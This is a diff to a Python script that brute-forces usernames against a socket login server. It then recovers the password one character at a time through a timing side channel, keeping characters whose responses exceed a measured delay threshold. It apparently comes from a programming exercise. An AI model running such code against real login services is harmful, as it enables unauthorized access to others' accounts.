@@ -1,7 +1,7 @@
 import socket
 from argparse import ArgumentParser
-import itertools
 import json
+import time
 
 NUM = '0123456789'
 L_CHAR = 'abcdefghijklmnopqrstuvwxyz'
@@ -43,9 +43,10 @@ def find_login():
         yield login
 
 
-def find_password(username):
+def find_password(username, max_res_time):
     """
     Find the right password for the user and return it
+    :param max_res_time: response time threshold to detect a delay in the server response when exception takes place
     :param username: correct login user
     :return: right password
     """
@@ -53,9 +54,12 @@ def find_password(username):
     while True:
         for letter in CHAR:
             login_info = convert_to_json(username, pw + letter)
+            start = time.time()
             res = response_info(login_info)
+            end = time.time()
+            res_time = end - start
 
-            if res == "Exception happened during login":
+            if res_time > max_res_time:
                 pw += letter
 
             if res == "Connection success!":
@@ -73,17 +77,21 @@ with socket.socket() as client_connection:
     client_connection.connect(address)
 
     user_generator = find_login()
+
+    res_time_list = []
     for user in user_generator:
         login_info = convert_to_json(user, ' ')
+        before = time.time()
         res = response_info(login_info)
+        after = time.time()
+        res_time_list.append(after-before)
+
         if res == "Wrong password!":
             login_user = user
             break
 
-    login_pw = find_password(login_user)
+    # find out the normal response time
+    res_threshold = 10 * max(res_time_list)
+    login_pw = find_password(login_user, res_threshold)
 
     print(convert_to_json(login_user, login_pw))
-
-
-
-
